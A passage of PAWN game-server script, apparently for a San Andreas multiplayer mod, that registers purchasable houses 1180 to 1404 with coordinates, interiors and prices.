	AddHouse(1180, -2368.824951, 763.493286, 35.151309, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1181);//Big house
	AddHouse(1181, -2372.530029, 783.903015, 35.114696, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1182);//Big house
	AddHouse(1182, -2358.686767, 796.755126, 38.313171, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1183);//Big house
	AddHouse(1183, -2340.051757, 796.766296, 41.988979, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1184);//Big house
	AddHouse(1184, -2321.583007, 796.766418, 45.344440, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1185);//Big house
	AddHouse(1185, -2303.375000, 796.764770, 48.691097, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1186);//Big house
	AddHouse(1186, -2286.484130, 796.763732, 49.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1187);//Big house
	AddHouse(1187, -2325.835693, 944.258361, 55.320613, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1188);//Big house
	AddHouse(1188, -2307.610351, 944.263549, 61.608230, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1189);//Big house
	AddHouse(1189, -2282.317382, 916.696228, 66.648437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1190);//Big house
	AddHouse(1190, -2282.415039, 873.128845, 66.917984, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1191);//Big house
	AddHouse(1191, -2284.986328, 849.557312, 65.414062, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1192);//Big house
	AddHouse(1192, -2285.310058, 829.288269, 57.170230, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1193);//Big house
	AddHouse(1193, -2295.037109, 969.982666, 65.336067, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1194);//Big house
	AddHouse(1194, -2282.418945, 979.160461, 70.797203, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1195);//Big house
	AddHouse(1195, -2238.892822, 980.495300, 71.413436, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1196);//Big house
	AddHouse(1196, -2282.420898, 999.491760, 79.249160, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1197);//Big house
	AddHouse(1197, -2240.082275, 999.061035, 79.105117, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1198);//Big house
	AddHouse(1198, -2303.437255, 820.035217, 48.700340, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1199);//Big house
	AddHouse(1199, -2321.718994, 819.986877, 45.339370, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1200);//Big house
	AddHouse(1200, -2340.009765, 819.908203, 41.975421, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1201);//Big house
	AddHouse(1201, -2358.439941, 820.032958, 38.536403, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1202);//Big house
	AddHouse(1202, -2372.560546, 871.919677, 44.509254, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1203);//Big house
	AddHouse(1203, -2370.366455, 847.327026, 43.421970, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1204);//Big house
	AddHouse(1204, -2372.560058, 834.326110, 37.977504, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1205);//Big house
	AddHouse(1205, -2018.550048, 784.698791, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1206);//Big house
	AddHouse(1206, -2018.546020, 766.134887, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1207);//Big house
	AddHouse(1207, -2029.871459, 746.086791, 49.468948, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1208);//Big house
	AddHouse(1208, -2047.940795, 746.078186, 57.025894, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1209);//Big house
	AddHouse(1209, -2066.438476, 746.090454, 64.879066, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1210);//Big house
	AddHouse(1210, -2094.512207, 746.446533, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1211);//Big house
	AddHouse(1211, -2112.673339, 746.441772, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1212);//Big house
	AddHouse(1212, -2126.037597, 755.421997, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1213);//Big house
	AddHouse(1213, -2126.039062, 774.124145, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1214);//Big house
	AddHouse(1214, -2112.456542, 795.740722, 69.568389, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1215);//Big house
	AddHouse(1215, -2094.133544, 795.752502, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1216);//Big house
	AddHouse(1216, -2066.437500, 796.113952, 64.921569, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1217);//Big house
	AddHouse(1217, -2048.262207, 796.101623, 57.042064, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1218);//Big house
	AddHouse(1218, -2029.874755, 796.098449, 49.473182, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1219);//Big house
	AddHouse(1219, -2016.350219, 897.668640, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1220);//Big house
	AddHouse(1220, -2018.545288, 865.631042, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1221);//Big house
	AddHouse(1221, -2018.542480, 849.210571, 45.448417, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1222);//Big house
	AddHouse(1222, -2018.548095, 832.077209, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1223);//Big house
	AddHouse(1223, -2029.712524, 820.692810, 49.457965, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1224);//Big house
	AddHouse(1224, -2048.140869, 820.682312, 57.025585, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1225);//Big house
	AddHouse(1225, -2066.415527, 820.685058, 64.918228, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1226);//Big house
	AddHouse(1226, -2094.384277, 823.548278, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1227);//Big house
	AddHouse(1227, -2112.444580, 823.550903, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1228);//Big house
	AddHouse(1228, -2126.056396, 832.728332, 69.562500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1229);//Big house
	AddHouse(1229, -2129.732421, 894.682556, 80.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1230);//Big house
	AddHouse(1230, -2174.405273, 934.385925, 80.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1231);//Big house
	AddHouse(1231, -2192.549072, 934.386474, 75.016258, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1232);//Big house
	AddHouse(1232, -2210.766601, 934.382812, 69.025321, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1233);//Big house
	AddHouse(1233, -2229.084472, 934.386108, 66.648437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1234);//Big house
	AddHouse(1234, -2238.789550, 943.995483, 66.652183, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1235);//Big house
	AddHouse(1235, -2238.788330, 962.243957, 66.652183, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1236);//Big house
	AddHouse(1236, -2172.718261, 1164.244262, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1237);//Big house
	AddHouse(1237, -2189.215087, 1163.747558, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1238);//Big house
	AddHouse(1238, -2205.675292, 1163.751953, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1239);//Big house
	AddHouse(1239, -2222.260253, 1163.746459, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1240);//Big house
	AddHouse(1240, -2239.292236, 1154.209594, 59.607284, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1241);//Big house
	AddHouse(1241, -2238.314208, 1135.818603, 67.261009, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1242);//Big house
	AddHouse(1242, -2238.309082, 1117.535156, 74.819908, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1243);//Big house
	AddHouse(1243, -2228.225585, 1108.048583, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1244);//Big house
	AddHouse(1244, -2207.981201, 1108.044433, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1245);//Big house
	AddHouse(1245, -2188.425292, 1108.041503, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1246);//Big house
	AddHouse(1246, -2168.185302, 1108.048706, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1247);//Big house
	AddHouse(1247, -2172.873046, 1079.993530, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1248);//Big house
	AddHouse(1248, -2191.411376, 1079.989746, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1249);//Big house
	AddHouse(1249, -2209.533447, 1079.992919, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1250);//Big house
	AddHouse(1250, -2228.060791, 1079.989013, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1251);//Big house
	AddHouse(1251, -2239.748291, 1070.626220, 81.023757, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1252);//Big house
	AddHouse(1252, -2239.743652, 1054.258789, 82.844894, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1253);//Big house
	AddHouse(1253, -2240.068847, 1037.874755, 83.849937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1254);//Big house
	AddHouse(1254, -2230.558837, 1028.024291, 83.843750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1255);//Big house
	AddHouse(1255, -2211.970947, 1057.498901, 80.013061, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1256);//Big house
	AddHouse(1256, -2221.018798, 1051.397338, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1257);//Big house
	AddHouse(1257, -2203.225341, 1043.343872, 80.013061, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1258);//Big house
	AddHouse(1258, -2169.559082, 1028.020751, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1259);//Big house
	AddHouse(1259, -2126.433105, 1014.311157, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1260);//Big house
	AddHouse(1260, -2126.432373, 996.332458, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1261);//Big house
	AddHouse(1261, -2126.447265, 978.281188, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1262);//Big house
	AddHouse(1262, -2129.632324, 942.576232, 80.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1263);//Big house
	AddHouse(1263, -2116.864990, 927.828369, 86.079063, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1264);//Big house
	AddHouse(1264, -2159.214355, 830.647705, 69.523147, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1265);//Big house
	AddHouse(1265, -2159.230712, 866.294616, 75.255241, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1266);//Big house
	AddHouse(1266, -2158.668701, 889.107482, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1267);//Big house
	AddHouse(1267, -2174.512939, 902.840759, 80.007812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1268);//Big house
	AddHouse(1268, -2192.570800, 902.665649, 75.011711, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1269);//Big house
	AddHouse(1269, -2210.937744, 902.670104, 68.971107, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1270);//Big house
	AddHouse(1270, -2225.066894, 902.666381, 66.648437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1271);//Big house
	AddHouse(1271, -2233.821533, 888.711547, 66.652481, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1272);//Big house
	AddHouse(1272, -2233.822998, 870.527282, 66.640907, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1273);//Big house
	AddHouse(1273, -2233.261230, 848.937805, 61.890625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1274);//Big house
	AddHouse(1274, -2233.261718, 830.441040, 54.304687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1275);//Big house
	AddHouse(1275, -2223.479003, 821.130187, 49.438667, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1276);//Big house
	AddHouse(1276, -2205.355224, 821.127563, 50.486373, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1277);//Big house
	AddHouse(1277, -2186.996337, 821.131713, 57.552536, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1278);//Big house
	AddHouse(1278, -2168.833251, 821.133789, 64.973602, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1279);//Big house
	AddHouse(1279, -2159.234375, 786.082092, 69.514801, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1280);//Big house
	AddHouse(1280, -2158.998779, 770.150024, 69.518592, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1281);//Big house
	AddHouse(1281, -2159.034667, 753.529113, 69.518020, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1282);//Big house
	AddHouse(1282, -2168.571777, 744.006713, 64.975967, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1283);//Big house
	AddHouse(1283, -2187.202148, 744.007568, 57.555198, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1284);//Big house
	AddHouse(1284, -2205.341064, 744.006774, 50.482810, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1285);//Big house
	AddHouse(1285, -2223.795166, 744.003234, 49.434257, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1286);//Big house
	AddHouse(1286, -2240.515625, 753.538696, 49.376815, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1287);//Big house
	AddHouse(1287, -2240.513916, 785.946716, 49.376792, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1288);//Big house
	AddHouse(1288, -2223.675048, 795.702819, 49.434268, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1289);//Big house
	AddHouse(1289, -2205.594970, 796.120117, 50.441150, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1290);//Big house
	AddHouse(1290, -2187.149902, 795.818115, 57.544525, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1291);//Big house
	AddHouse(1291, -2168.711669, 795.703063, 64.976821, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1292);//Big house
	AddHouse(1292, -2018.056640, 970.156372, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1293);//Big house
	AddHouse(1293, -2018.300170, 982.683227, 47.685096, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1294);//Big house
	AddHouse(1294, -2017.752685, 999.991027, 50.838047, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1295);//Big house
	AddHouse(1295, -2018.257202, 1017.156860, 53.871345, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1296);//Big house
	AddHouse(1296, -2282.416015, 1023.060607, 84.112472, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1297);//Big house
	AddHouse(1297, -2282.418701, 1046.759521, 84.120544, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1298);//Big house
	AddHouse(1298, -2282.421142, 1070.536376, 81.703163, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1299);//Big house
	AddHouse(1299, -2282.425292, 1088.803588, 80.406105, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1300);//Big house
	AddHouse(1300, -2280.834228, 1112.600341, 76.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1301);//Big house
	AddHouse(1301, -2280.836181, 1130.794189, 69.226562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1302);//Big house
	AddHouse(1302, -2280.830810, 1149.141723, 61.609375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1303);//Big house
	AddHouse(1303, -2369.363037, 1122.303833, 55.733276, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1304);//Big house
	AddHouse(1304, -2383.814941, 1128.148559, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1305);//Big house
	AddHouse(1305, -2396.660156, 1132.743652, 55.733276, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1306);//Big house
	AddHouse(1306, -2406.907470, 1135.428466, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1307);//Big house
	AddHouse(1307, -2413.459472, 1137.438720, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1308);//Big house
	AddHouse(1308, -2423.849609, 1139.413696, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1309);//Big house
	AddHouse(1309, -2438.189697, 1141.001708, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1310);//Big house
	AddHouse(1310, -2450.922119, 1141.755493, 55.733276, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1311);//Big house
	AddHouse(1311, -2461.678222, 1141.898803, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1312);//Big house
	AddHouse(1312, -2468.626708, 1141.909667, 55.733268, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1313);//Big house
	AddHouse(1313, -2478.977783, 1141.970581, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1314);//Big house
	AddHouse(1314, -2493.293945, 1141.974121, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1315);//Big house
	AddHouse(1315, -2506.352294, 1142.150024, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1316);//Big house
	AddHouse(1316, -2516.943115, 1142.395019, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1317);//Big house
	AddHouse(1317, -2523.766113, 1142.684204, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1318);//Big house
	AddHouse(1318, -2534.344238, 1143.738403, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1319);//Big house
	AddHouse(1319, -2548.910644, 1145.690795, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1320);//Big house
	AddHouse(1320, -2562.835693, 1149.027587, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1321);//Big house
	AddHouse(1321, -2596.646972, 986.179870, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1322);//Big house
	AddHouse(1322, -2597.328857, 979.665832, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1323);//Big house
	AddHouse(1323, -2597.330810, 969.215393, 78.283546, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1324);//Big house
	AddHouse(1324, -2591.173339, 960.647888, 78.453125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1325);//Big house
	AddHouse(1325, -2591.184570, 944.307006, 70.429687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1326);//Big house
	AddHouse(1326, -2591.176025, 935.882202, 68.929687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1327);//Big house
	AddHouse(1327, -2591.189453, 927.902709, 65.015625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1328);//Big house
	AddHouse(1328, -2580.685302, 920.379333, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1329);//Big house
	AddHouse(1329, -2569.873779, 920.372802, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1330);//Big house
	AddHouse(1330, -2562.368652, 920.377197, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1331);//Big house
	AddHouse(1331, -2551.820800, 920.379455, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1332);//Big house
	AddHouse(1332, -2545.331787, 920.345764, 64.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1333);//Big house
	AddHouse(1333, -2543.213134, 922.114074, 67.093750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1334); //A small house ;)
	AddHouse(1334, -2537.135742, 929.428527, 65.013389, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1335);//Big house
	AddHouse(1335, -2542.503417, 942.797424, 64.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1336);//Big house
	AddHouse(1336, -2542.505126, 951.339111, 65.505256, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1337);//Big house
	AddHouse(1337, -2542.490234, 967.667175, 73.536590, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1338);//Big house
	AddHouse(1338, -2541.658691, 975.564086, 77.251426, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1339);//Big house
	AddHouse(1339, -2541.640380, 987.995849, 78.289062, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1340);//Big house
	AddHouse(1340, -2553.688232, 992.298278, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1341);//Big house
	AddHouse(1341, -2564.218261, 992.257568, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1342);//Big house
	AddHouse(1342, -2573.592041, 992.272216, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1343);//Big house
	AddHouse(1343, -2584.068359, 992.252075, 78.273437, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1344);//Big house
	AddHouse(1344, -2732.096679, 808.129272, 53.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1345); //A small house ;)
	AddHouse(1345, -2738.315673, 801.616455, 53.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1346); //A small house ;)
	AddHouse(1346, -2738.314941, 797.389282, 53.267539, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1347); //A small house ;)
	AddHouse(1347, -2737.848388, 836.625671, 56.253654, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1348); //A small house ;)
	AddHouse(1348, -2736.878417, 846.664672, 59.272781, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1349); //A small house ;)
	AddHouse(1349, -2737.744140, 866.243530, 64.632812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1350); //A small house ;)
	AddHouse(1350, -2706.473388, 865.044982, 70.703125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1351);//Big house
	AddHouse(1351, -2710.705078, 967.477661, 54.460937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1352);//Big house
	AddHouse(1352, -2655.734375, 986.368103, 64.991287, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1353);//Big house
	AddHouse(1353, -2640.935058, 935.716308, 71.953125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1354);//Big house
	AddHouse(1354, -2720.863769, 923.982116, 67.593750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1355);//Big house
	AddHouse(1355, -2671.105712, 927.440246, 79.703125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1356);//Big house
	AddHouse(1356, -2620.234619, 883.333374, 63.250000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1357);//Big house
	AddHouse(1357, -2619.945068, 875.019348, 58.921875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1358);//Big house
	AddHouse(1358, -2619.741455, 855.276916, 53.568695, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1359);//Big house
	AddHouse(1359, -2619.740722, 845.341003, 50.597320, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1360);//Big house
	AddHouse(1360, -2618.617431, 831.068664, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1361);//Big house
	AddHouse(1361, -2620.772460, 832.827575, 52.093750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1362); //A small house ;)
	AddHouse(1362, -2641.817871, 820.317138, 49.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1363); //A small house ;)
	AddHouse(1363, -2652.661865, 820.318115, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1364);//Big house
	AddHouse(1364, -2666.956298, 820.317504, 49.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1365); //A small house ;)
	AddHouse(1365, -2726.746582, 822.978759, 53.727672, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1366);//Big house
	AddHouse(1366, -2737.486816, 822.989624, 53.730377, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1367); //A small house ;)
	AddHouse(1367, -2592.933105, 833.163391, 52.093750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1368); //A small house ;)
	AddHouse(1368, -2594.697021, 830.890930, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1369);//Big house
	AddHouse(1369, -2593.720703, 845.050842, 50.599269, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1370);//Big house
	AddHouse(1370, -2593.134277, 855.016662, 53.626132, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1371);//Big house
	AddHouse(1371, -2593.422607, 874.981262, 58.921875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1372);//Big house
	AddHouse(1372, -2593.210449, 883.097961, 63.250000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1373);//Big house
	AddHouse(1373, -2583.746826, 896.252685, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1374);//Big house
	AddHouse(1374, -2573.175537, 896.261901, 64.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1375); //A small house ;)
	AddHouse(1375, -2566.471191, 896.643249, 64.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1376); //A small house ;)
	AddHouse(1376, -2555.795898, 896.641540, 64.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1377);//Big house
	AddHouse(1377, -2541.856689, 896.640991, 64.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1378); //A small house ;)
	AddHouse(1378, -2540.211425, 883.111206, 63.250000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1379);//Big house
	AddHouse(1379, -2539.997070, 874.743347, 58.921875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1380);//Big house
	AddHouse(1380, -2540.511230, 831.946228, 52.093750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1381); //A small house ;)
	AddHouse(1381, -2538.726806, 829.962585, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1382);//Big house
	AddHouse(1382, -2548.723144, 819.793212, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1383);//Big house
	AddHouse(1383, -2559.401367, 819.799438, 49.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1384); //A small house ;)
	AddHouse(1384, -2576.540771, 819.612121, 49.984375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1385);//Big house
	AddHouse(1385, -2591.029785, 819.799804, 49.991027, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1386); //A small house ;)
	AddHouse(1386, -2586.020507, 794.177551, 49.423717, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1387); //A small house ;)
	AddHouse(1387, -2569.146728, 794.175476, 49.423439, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1388);//Big house
	AddHouse(1388, -2550.857421, 794.176025, 49.423511, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1389);//Big house
	AddHouse(1389, -2541.253906, 785.201171, 46.227596, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1390);//Big house
	AddHouse(1390, -2541.247558, 768.119506, 40.021060, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1391);//Big house
	AddHouse(1391, -2541.253173, 750.888977, 33.701519, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1392);//Big house
	AddHouse(1392, -2541.290039, 733.179626, 28.051811, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1393);//Big house
	AddHouse(1393, -2594.762939, 733.088439, 28.412099, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1394); //A small house ;)
	AddHouse(1394, -2594.193115, 750.896911, 33.704338, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1395); //A small house ;)
	AddHouse(1395, -2594.189453, 768.013305, 40.015586, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1396); //A small house ;)
	AddHouse(1396, -2594.200439, 785.300292, 46.239837, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1397); //A small house ;)
	AddHouse(1397, -2540.682617, 855.097900, 53.179687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1398);//Big house
	AddHouse(1398, -2539.709228, 844.990356, 50.599830, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1399);//Big house
	AddHouse(1399, -2409.203857, 819.973510, 35.179687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1400);//Big house
	AddHouse(1400, -2447.448974, 821.614013, 35.179687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1401);//Big house
	AddHouse(1401, -2487.406494, 821.306945, 38.384849, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1402);//Big house
	AddHouse(1402, -2504.429687, 821.304626, 45.987087, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1403);//Big house
	AddHouse(1403, -2513.505126, 830.825073, 49.998268, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1404);//Big house
	AddHouse(1404, -2513.504394, 849.177062, 52.695312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1405);//Big house
